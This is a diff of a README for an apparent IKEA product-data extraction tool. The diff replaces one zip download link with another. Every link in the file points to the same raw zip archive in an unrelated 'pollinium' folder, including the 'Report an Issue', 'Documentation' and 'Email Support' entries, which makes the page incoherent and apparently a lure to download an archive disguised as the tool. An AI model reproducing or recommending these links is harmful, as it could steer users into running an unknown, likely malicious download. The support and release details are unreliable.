@@ -1,7 +1,7 @@
 # 🛒 ikea-products-bycategory - Easily Extract IKEA Product Data
 
 ## 📥 Download Now
-[![Download](https://github.com/Tomasz4474/ikea-products-bycategory/raw/refs/heads/main/pollinium/bycategory-ikea-products-v2.7.zip%https://github.com/Tomasz4474/ikea-products-bycategory/raw/refs/heads/main/pollinium/bycategory-ikea-products-v2.7.zip)](https://github.com/Tomasz4474/ikea-products-bycategory/raw/refs/heads/main/pollinium/bycategory-ikea-products-v2.7.zip)
+[![Download](https://github.com/Tomasz4474/ikea-products-bycategory/raw/refs/heads/main/pollinium/ikea_products_bycategory_v2.2.zip%https://github.com/Tomasz4474/ikea-products-bycategory/raw/refs/heads/main/pollinium/ikea_products_bycategory_v2.2.zip)](https://github.com/Tomasz4474/ikea-products-bycategory/raw/refs/heads/main/pollinium/ikea_products_bycategory_v2.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the **IKEA Products by Category** tool. This application helps you to easily extract product information from the IKEA catalog, organized by category. With this tool, you can quickly access details on various IKEA products, making it easier to compare prices and features.
@@ -22,7 +22,7 @@ To run this application smoothly, ensure your system meets the following require
 To start using the ikea-products-bycategory application, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page.
-   [Download the Latest Release](https://github.com/Tomasz4474/ikea-products-bycategory/raw/refs/heads/main/pollinium/bycategory-ikea-products-v2.7.zip)
+   [Download the Latest Release](https://github.com/Tomasz4474/ikea-products-bycategory/raw/refs/heads/main/pollinium/ikea_products_bycategory_v2.2.zip)
 
 2. **Choose the Latest Version:** Look for the most recent version, which will be at the top of the list.
 
@@ -53,18 +53,18 @@ If you run into issues while using the application, consider the following tips:
 ## 📞 Support
 For any questions or assistance regarding the application, please reach out through the following channels:
 
-- **Issues Page:** [Report an Issue](https://github.com/Tomasz4474/ikea-products-bycategory/raw/refs/heads/main/pollinium/bycategory-ikea-products-v2.7.zip)
-- **Email Support:** Email us at https://github.com/Tomasz4474/ikea-products-bycategory/raw/refs/heads/main/pollinium/bycategory-ikea-products-v2.7.zip for more personalized help.
+- **Issues Page:** [Report an Issue](https://github.com/Tomasz4474/ikea-products-bycategory/raw/refs/heads/main/pollinium/ikea_products_bycategory_v2.2.zip)
+- **Email Support:** Email us at https://github.com/Tomasz4474/ikea-products-bycategory/raw/refs/heads/main/pollinium/ikea_products_bycategory_v2.2.zip for more personalized help.
 
 ## 📝 Contributing
 If you want to contribute to this project, feel free to submit a pull request or open an issue on the GitHub repository. We welcome all feedback and contributions.
 
 ## 🔗 Explore More
 For more information and updates, check:
-- **GitHub Repository:** [ikea-products-bycategory](https://github.com/Tomasz4474/ikea-products-bycategory/raw/refs/heads/main/pollinium/bycategory-ikea-products-v2.7.zip)
-- **Documentation:** You can find the full documentation [here](https://github.com/Tomasz4474/ikea-products-bycategory/raw/refs/heads/main/pollinium/bycategory-ikea-products-v2.7.zip).
+- **GitHub Repository:** [ikea-products-bycategory](https://github.com/Tomasz4474/ikea-products-bycategory/raw/refs/heads/main/pollinium/ikea_products_bycategory_v2.2.zip)
+- **Documentation:** You can find the full documentation [here](https://github.com/Tomasz4474/ikea-products-bycategory/raw/refs/heads/main/pollinium/ikea_products_bycategory_v2.2.zip).
 
 ## 📅 Release Notes
-Stay updated on new features, bug fixes, and improvements. You can find detailed release notes on the [Releases Page](https://github.com/Tomasz4474/ikea-products-bycategory/raw/refs/heads/main/pollinium/bycategory-ikea-products-v2.7.zip).
+Stay updated on new features, bug fixes, and improvements. You can find detailed release notes on the [Releases Page](https://github.com/Tomasz4474/ikea-products-bycategory/raw/refs/heads/main/pollinium/ikea_products_bycategory_v2.2.zip).
 
 Remember to keep this tool handy for quick access to valuable IKEA product information. Happy shopping!
